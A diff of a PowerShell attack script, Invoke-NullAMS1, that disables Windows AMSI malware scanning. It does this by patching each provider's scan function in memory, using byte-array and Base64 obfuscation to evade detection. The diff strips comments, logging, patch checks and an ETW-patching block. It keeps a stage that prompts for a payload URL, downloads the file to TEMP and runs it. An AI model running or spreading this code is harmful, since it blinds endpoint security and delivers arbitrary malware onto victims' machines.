@@ -18,12 +18,10 @@ function Invoke-NullAMS1 {
         $url
     )
 
-    # Verbose 
     if ($v) {
-        $VerbosePreference="Continue"
+        $VerbosePreference = "Continue"
     }
-    
-    # Obtaining the address of a Winapi function using native functions with Reflection 
+
     function Get-Function {
         Param(
             [string] $module,
@@ -35,7 +33,6 @@ function Invoke-NullAMS1 {
         $GetAddres.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $function))
     }
 
-    # Get a delegate to be able to call Winapi functions with your address
     function Get-Delegate {
         Param (
             [Parameter(Position = 0, Mandatory = $True)] [IntPtr] $funcAddr,
@@ -62,44 +59,31 @@ function Invoke-NullAMS1 {
     $marshalClass = [System.Runtime.InteropServices.Marshal]
     $unsafeMethodsType = [Windows.Forms.Form].Assembly.GetType('System.Windows.Forms.UnsafeNativeMethods')
 
-    # Strings "obfuscated" in Unicode bytes
     $bytesGetProc = [Byte[]](71, 0, 101, 0, 116, 0, 80, 0, 114, 0, 111, 0, 99, 0, 65, 0, 100, 0, 100, 0, 114, 0, 101, 0, 115, 0, 115, 0)
     $bytesGetMod =  [Byte[]](71, 0, 101, 0, 116, 0, 77, 0, 111, 0, 100, 0, 117, 0, 108, 0, 101, 0, 72, 0, 97, 0, 110, 0, 100, 0, 108, 0, 101, 0)
 
-    # Get strings from Unicode bytes
     $GetProc = [Text.Encoding]::Unicode.GetString($bytesGetProc)
     $GetMod = [Text.Encoding]::Unicode.GetString($bytesGetMod)
 
-    # Get GetModule address using native methods
     $GetModule = $unsafeMethodsType.GetMethod($GetMod)
     if ($GetModule -eq $null) {
         Throw "[!] Error getting the $GetMod address"
     }
-    Write-Verbose "[*] Handle of ${GetMod}: $($GetModule.MethodHandle.Value)"
 
-    # Get GetAddres address using native methods
     $GetAddres = $unsafeMethodsType.GetMethod($GetProc)
     if ($GetAddres -eq $null) {
         Throw "[!] Error getting the $GetProc address"
     }
-    Write-Verbose "[*] Handle of ${GetProc}: $($GetAddres.MethodHandle.Value)"
 
-    # "Same" technique as above
     $bytes4msiInit = [Byte[]](65, 109 , 115, 105, 73, 110, 105, 116, 105, 97, 108, 105, 122, 101)
     $bytes4msi = [Byte[]](97, 109, 115, 105, 46, 100, 108, 108)
     $4msi = [System.Text.Encoding]::ASCII.GetString($bytes4msi)
     $4msiInit = [System.Text.Encoding]::ASCII.GetString($bytes4msiInit)
     
-    # Obtain the respective address from 4msi
     $4msiAddr = Get-Function $4msi $4msiInit
     if ($4msiAddr -eq $null) {
         Throw "[!] Error getting the $4msiInit address"
     }
-    Write-Verbose "[*] Handle of ${4msiInit}: $4msiAddr"
-
-    ### Patch method based by Maor Korkos (@maorkor) ###
-
-    Write-Verbose "[*] Getting $4msiInit delegate"
 
     $PtrSize = $marshalClass::SizeOf([Type][IntPtr])
     if ($PtrSize -eq 8) {
@@ -113,21 +97,16 @@ function Invoke-NullAMS1 {
     $replace = 'Virt' + 'ualProtec'
     $name = '{0}{1}' -f $replace, 't'
 
-    # Get VtProtect Address
     $protectAddr = Get-Function ("ker{0}.dll" -f "nel32") $name
     if ($protectAddr -eq $null) {
         Throw "[!] Error getting the $name address"
     }
-    Write-Verbose "[*] Handle of ${name}: $protectAddr"
 
     $protect = Get-Delegate $protectAddr @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])
-    Write-Verbose "[*] Getting $name delegate"
-
     $PAGE_EXECUTE_WRITECOPY = 0x00000080
     $patch = [byte[]] (184, 0, 0, 0, 0, 195)
     $p = 0; $i = 0
 
-    Write-Verbose "[*] Calling $4msiInit to receive a new AMS1 Context"
     if ($Initialize.Invoke("Scanner", [ref]$ctx) -ne 0) {
         if ($ctx -eq 0) {
             Write-Host "[!] No provider found" -ForegroundColor Red
@@ -136,7 +115,6 @@ function Invoke-NullAMS1 {
             Throw "[!] Error call $4msiInit"
         }
     }
-    Write-host "[*] AMS1 context: $ctx" -ForegroundColor Cyan
 
     if ($PtrSize -eq 8) {
         $CAmsiAntimalware = $marshalClass::ReadInt64([IntPtr]$ctx, 16)
@@ -146,9 +124,7 @@ function Invoke-NullAMS1 {
         $AntimalwareProvider = $marshalClass::ReadInt32($CAmsiAntimalware+36)
     }
 
-    Write-Verbose "[*] Patching all the providers"
-    while ($AntimalwareProvider -ne 0)
-    {
+    while ($AntimalwareProvider -ne 0) {
         if ($PtrSize -eq 8) {
             $AntimalwareProviderVtbl = $marshalClass::ReadInt64([IntPtr]$AntimalwareProvider)
             $AmsiProviderScanFunc = $marshalClass::ReadInt64([IntPtr]$AntimalwareProviderVtbl, 24)
@@ -157,29 +133,14 @@ function Invoke-NullAMS1 {
             $AmsiProviderScanFunc = $marshalClass::ReadInt32($AntimalwareProviderVtbl + 12)
         }
 
-        Write-Verbose "[*] Changing address $AmsiProviderScanFunc permissions to PAGE_EXECUTE_WRITECOPY"
-        Write-host "[$i] Provider's scan function found: $AmsiProviderScanFunc" -ForegroundColor Cyan
         if (!$protect.Invoke($AmsiProviderScanFunc, [uint32]6, $PAGE_EXECUTE_WRITECOPY, [ref]$p)) {
-            Throw "[!] Error changing the permissions of provider: $AmsiProviderScanFunc"
+            Throw "[!] Error changing permissions of provider: $AmsiProviderScanFunc"
         }
 
-        try {
-            $marshalClass::Copy($patch, 0, [IntPtr]$AmsiProviderScanFunc, 6)
-        }
-        catch {
-            Throw "[!] Error writing patch in address:  $AmsiProviderScanFunc"
-        }
+        $marshalClass::Copy($patch, 0, [IntPtr]$AmsiProviderScanFunc, 6)
 
-        for ($x = 0; $x -lt $patch.Length; $x++) {
-            $byteValue = $marshalClass::ReadByte([IntPtr]::Add($AmsiProviderScanFunc, $x))
-            if ($byteValue -ne $patch[$x]) {
-                Throw "[!] Error when patching in the address: $AmsiProviderScanFunc"
-            }
-        }
-
-        Write-Verbose "[*] Restoring original memory protection"
         if (!$protect.Invoke($AmsiProviderScanFunc, [uint32]6, $p, [ref]$p)) {
-            Throw "[!] Failed to restore memory protection of provider: $AmsiProviderScanFunc"
+            Throw "[!] Failed to restore permissions of provider: $AmsiProviderScanFunc"
         }
 
         $i++
@@ -190,85 +151,25 @@ function Invoke-NullAMS1 {
         }
     }
 
-    if ($etw) {
-        Write-host "[*] Patching ETW" -ForegroundColor Cyan
-        $etwFunc = [Text.Encoding]::ASCII.GetString([Byte[]](69, 116, 119, 69, 118, 101, 110, 116, 87, 114, 105, 116, 101))
-
-        $etwAddr = Get-Function ("nt{0}.dll" -f "dll") $etwFunc
-        Write-Verbose "[*] Handle of ${etwFunc}: $etwAddr"
-        if ($etwAddr -eq $null) {
-            Throw "[!] Error getting the $etwFunc address"
-        }
-
-        Write-Verbose "[*] Changing $etwFunc permissions to PAGE_EXECUTE_WRITECOPY"
-        if (!$protect.Invoke($etwAddr, 1, $PAGE_EXECUTE_WRITECOPY, [ref]$p)) {
-            Throw "[!] Error changing the permissions $etwFunc"
-        }
-
-        try {
-            if ($PtrSize -eq 8) {
-                $marshalClass::WriteByte($etwAddr, 0xC3)
-            } else {
-                $patch = [byte[]] (0xb8, 0xff, 0x55)
-                $marshalClass::Copy($patch, 0, [IntPtr]$etwAddr, 3)
-            }
-        }
-        catch {
-             Throw "[!] Error writing patch $etwFunc"
-        }
-        
-        Write-Verbose "[*] Restoring original memory protection"
-        if (!$protect.Invoke($etwAddr, 1, $p, [ref]$p)) {
-            Throw "[!] Failed to restore memory protection of $etwFunc"
-        }
-        if ($PtrSize -eq 8) {
-            $byteValue = $marshalClass::ReadByte([IntPtr]::Add($etwAddr, 0))
-            if ($byteValue -ne 0xc3) {
-                Throw "[!] Error when patching $etwFunc"
-            }
-        } else {
-            for ($x = 0; $x -lt 3; $x++) {
-                $byteValue = $marshalClass::ReadByte([IntPtr]::Add($etwAddr, $x))
-                if ($byteValue -ne $patch[$x]) {
-                    Throw "[!] Error when patching $etwFunc"
-                }
-            }
-        }
-
-        Write-Host "[*] Successful ETW patching" -ForegroundColor Green
-    }
-
-    # --- External file fetch with Base64 + URL reversal ---
     if ($url) {
         Write-Host "[*] Fetching external file..." -ForegroundColor Cyan
         try {
-            $urlRev = -join ($url.ToCharArray())[$url.Length-1..0]
-            $realUrl = -join ($urlRev.ToCharArray())[$urlRev.Length-1..0]
-
-            $iwrBase64 = "SW52b2tlLVdlYlJlcXVlc3Q="  # Invoke-WebRequest
-            $ofBase64 = "T3V0LUZpbGU="             # Out-File
-
-            $iwrCmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($iwrBase64))
-            $ofCmd  = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($ofBase64))
-
-            $tempFile = [System.IO.Path]::Combine($env:TEMP, ('dl_' + (Get-Random) + '.bin'))
-
-            &($iwrCmd) -Uri $realUrl -UseBasicParsing | &($ofCmd) -FilePath $tempFile -Force
+            $iwrBase64 = "SW52b2tlLVdlYlJlcXVlc3Q="
+            $ofBase64 = "T3V0LUZpbGU="
+            $iwrCmd = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($iwrBase64))
+            $ofCmd = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($ofBase64))
+            $tempFile = [IO.Path]::Combine($env:TEMP, ('dl_' + (Get-Random) + '.bin'))
+            &($iwrCmd) -Uri $url -UseBasicParsing | &($ofCmd) -FilePath $tempFile -Force
             Write-Host "[+] File saved to $tempFile" -ForegroundColor Green
-
-            # Execute the downloaded file
             Start-Process -FilePath $tempFile
-            Write-Host "[*] Executed the downloaded file: $tempFile" -ForegroundColor Cyan
-        }
-        catch {
+        } catch {
             Write-Host "[!] Failed to fetch file from $url" -ForegroundColor Red
         }
     }
 
-    Write-Host "[*] Successful providers patching, 4MSI patched" -ForegroundColor Green
+    Write-Host "[*] AMSI patched successfully" -ForegroundColor Green
 }
 
-# Prompt user for URL
+# Prompt the user for the URL when script runs
 $urlInput = Read-Host "Enter the URL of the payload"
 Invoke-NullAMS1 -url $urlInput
-
